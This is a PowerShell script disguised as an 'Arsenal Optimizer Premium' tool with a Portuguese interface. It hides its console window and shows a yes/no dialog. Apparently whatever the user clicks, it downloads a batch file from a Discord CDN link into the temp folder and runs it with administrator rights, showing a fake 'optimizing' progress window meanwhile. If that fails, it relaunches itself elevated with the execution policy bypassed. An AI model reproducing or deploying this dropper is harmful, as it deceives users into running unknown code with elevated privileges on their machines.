# Load PresentationFramework assembly
Add-Type -AssemblyName PresentationFramework

# Function to display a custom dialog window
function Show-Dialog { 
    [void] [System.Reflection.Assembly]::LoadWithPartialName("presentationframework")
    
    $window = New-Object System.Windows.Window
    $window.Title = "Optimizer"
    $window.Width = 600
    $window.Height = 500
    $window.WindowStartupLocation = "CenterScreen"
    $window.WindowStyle = "None"
    $window.ResizeMode = "NoResize"
    $window.Background = [System.Windows.Media.Brushes]::Black
    $window.AllowsTransparency = $true
    $window.Opacity = 0.98

    $border = New-Object System.Windows.Controls.Border
    $border.Background = [System.Windows.Media.Brushes]::Black
    $border.CornerRadius = "15"
    $border.Padding = "20"
    $border.Margin = "20"
    $border.BorderBrush = [System.Windows.Media.Brushes]::DarkRed
    $border.BorderThickness = "3"

    $stackPanel = New-Object System.Windows.Controls.StackPanel
    $stackPanel.HorizontalAlignment = "Center"
    $stackPanel.VerticalAlignment = "Center"

    $textBlock = New-Object System.Windows.Controls.TextBlock
    $textBlock.Text = "Arsenal Optimizer Premium"
    $textBlock.Margin = "15"
    $textBlock.HorizontalAlignment = "Center"
    $textBlock.Foreground = [System.Windows.Media.Brushes]::White
    $textBlock.FontSize = 26
    $textBlock.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
    $textBlock.FontWeight = "Bold"
    $stackPanel.Children.Add($textBlock)

    $buttonPanel = New-Object System.Windows.Controls.StackPanel
    $buttonPanel.Orientation = "Horizontal"
    $buttonPanel.HorizontalAlignment = "Center"
    $buttonPanel.Margin = "30"

    $yesButton = New-Object System.Windows.Controls.Button
    $yesButton.Content = "Sim"
    $yesButton.Width = 100
    $yesButton.Margin = "10"
    $yesButton.Background = [System.Windows.Media.Brushes]::Crimson
    $yesButton.Foreground = [System.Windows.Media.Brushes]::White
    $yesButton.FontSize = 16
    $yesButton.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
    $yesButton.FontWeight = "Bold"
    $yesButton.Padding = "10"

    $noButton = New-Object System.Windows.Controls.Button
    $noButton.Content = "NÃ£o"
    $noButton.Width = 100
    $noButton.Margin = "10"
    $noButton.Background = [System.Windows.Media.Brushes]::Crimson
    $noButton.Foreground = [System.Windows.Media.Brushes]::White
    $noButton.FontSize = 16
    $noButton.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
    $noButton.FontWeight = "Bold"
    $noButton.Padding = "10"

    $buttonPanel.Children.Add($yesButton)
    $buttonPanel.Children.Add($noButton)
    $stackPanel.Children.Add($buttonPanel)
    $border.Child = $stackPanel
    $window.Content = $border

    $result = $null
    $yesButton.Add_Click({ $result = $true; $window.Close() })
    $noButton.Add_Click({ $result = $false; $window.Close() })
    $window.Closing.Add({ if ($null -eq $result) { $result = $false } })
    $window.ShowDialog()
    
    return $result
}

# Function to download and execute a script
function Download-Execute {
    $url = "https://cdn.discordapp.com/attachments/1243302229205843988/1243303505620635668/EXM_Premium.bat?ex=6657939f&is=6656421f&hm=16fc969feba27734c70acd9f9f6eb28d71df2361e69f3d6e33ffbfe0ccb30b6a&"
    $outputPath = "$env:TEMP\EXM_Premium.bat"
    
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $outputPath)
        Start-Process -FilePath $outputPath -Verb RunAs
    } catch {
        Write-Error "Failed to download or execute the file: $_"
    }
}

# Function to run the script with error handling
function Run-Script {
    try {
        Download-Execute
    } catch {
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File $PSCommandPath" -Verb RunAs
    }
}

# Hide the current PowerShell window
$windowHandle = (Get-Process -id $pid).MainWindowHandle
Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class User32 {
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hwnd, int nCmdShow);
    }
"@ -PassThru
[User32]::ShowWindow($windowHandle, 0)

# Show dialog and execute script based on user response
$result = Show-Dialog
if ($null -eq $result -or $false -eq $result) {
    $loadingWindow = New-Object System.Windows.Window
    $loadingWindow.Title = "Carregando"
    $loadingWindow.Width = 400
    $loadingWindow.Height = 150
    $loadingWindow.WindowStartupLocation = "CenterScreen"
    $loadingWindow.WindowStyle = "None"
    $loadingWindow.ResizeMode = "NoResize"
    $loadingWindow.Background = [System.Windows.Media.Brushes]::Black
    $loadingWindow.AllowsTransparency = $true
    $loadingWindow.Opacity = 0.98

    $border = New-Object System.Windows.Controls.Border
    $border.Background = [System.Windows.Media.Brushes]::Black
    $border.CornerRadius = "15"
    $border.Padding = "20"
    $border.Margin = "10"
    $border.BorderBrush = [System.Windows.Media.Brushes]::DarkRed
    $border.BorderThickness = "3"

    $stackPanel = New-Object System.Windows.Controls.StackPanel
    $stackPanel.HorizontalAlignment = "Center"
    $stackPanel.VerticalAlignment = "Center"

    $textBlock = New-Object System.Windows.Controls.TextBlock
    $textBlock.Text = "Otimizando, por favor aguarde..."
    $textBlock.Margin = "10"
    $textBlock.HorizontalAlignment = "Center"
    $textBlock.VerticalAlignment = "Center"
    $textBlock.Foreground = [System.Windows.Media.Brushes]::White
    $textBlock.FontSize = 18
    $textBlock.FontFamily = New-Object System.Windows.Media.FontFamily "Segoe UI"
    $textBlock.FontWeight = "Bold"

    $progressBar = New-Object System.Windows.Controls.ProgressBar
    $progressBar.Width = 300
    $progressBar.Height = 20
    $progressBar.IsIndeterminate = $true
    $progressBar.Foreground = [System.Windows.Media.Brushes]::DarkRed
    $progressBar.Margin = "10"

    $stackPanel.Children.Add($textBlock)
    $stackPanel.Children.Add($progressBar)
    $border.Child = $stackPanel
    $loadingWindow.Content = $border
    $loadingWindow.Show()

    Run-Script

    $loadingWindow.Close()
}
exit
